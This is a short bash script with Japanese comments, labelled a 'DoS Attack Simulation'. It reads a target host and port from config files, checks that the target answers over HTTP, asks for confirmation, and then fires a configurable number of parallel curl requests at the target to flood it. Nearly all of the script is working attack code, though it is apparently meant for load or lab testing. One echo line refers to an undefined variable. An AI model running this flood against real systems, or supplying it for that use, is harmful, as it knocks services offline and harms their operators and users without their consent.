#!/bin/bash


# 設定ファイル
source ./config/target.cfg
source ./config/attacks.cfg

echo '=========================================================='
echo '[*] DoS Attack Simulation'
echo '----------------------------------------------------------'
echo ' Target Info'
echo "   HOST : ${TARGET_HOST}"
echo "   PORT : ${TARGET_PORT}"
echo '----------------------------------------------------------'

url=http://${TARGET_HOST}:${TARGET_PORT}


# 接続確認
echo '[*] Pre-checking the target...'
code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "${url}")";

if [[ "$code" == "200" ]]; then
    echo "[✓] Connectivity OK  -> ${url} (HTTP ${code})"
    echo
else
    echo "[!] Unable to connect to ${url} (HTTP ${code})"
    echo 
fi

# 攻撃コマンド実行
read -p '[*] 攻撃を開始しますか？ (y/n): ' answer
if [[ "${answer}" != "y" ]]; then 
    echo '[+] 攻撃を中止します。' 
    exit 0
fi 

echo "[*] Running DoS simulation: ${count} requests to ${TARGET_HOST}"
echo "    \`\`\`"
echo "    curl -sS -o /dev/null -w \"%{http_code} \" \"${url}\" &"
echo "    \`\`\`"

for ((i=1; i<=${DOS_COUNT}; i++)); do
    curl -sS -o /dev/null -w "%{http_code} " "${url}" &
done
wait

echo 
echo 
echo '----------------------------------------------------------'
echo '[+] Completed.'
echo '=========================================================='
echo
sleep 3